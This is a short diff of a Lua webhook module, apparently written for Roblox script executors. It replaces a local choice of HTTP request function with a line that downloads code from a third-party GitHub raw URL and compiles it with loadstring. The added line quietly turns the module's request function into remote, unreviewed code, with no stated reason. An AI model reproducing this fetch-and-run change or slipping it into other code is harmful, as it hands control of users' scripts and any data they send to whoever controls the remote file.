@@ -1,4 +1,4 @@
-local request = http_request or request or HttpPost or syn.request
+local request = loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/Webhook/main/Anti.lua"))
 local HttpService = game:GetService("HttpService")
 local Webhook = {}
 
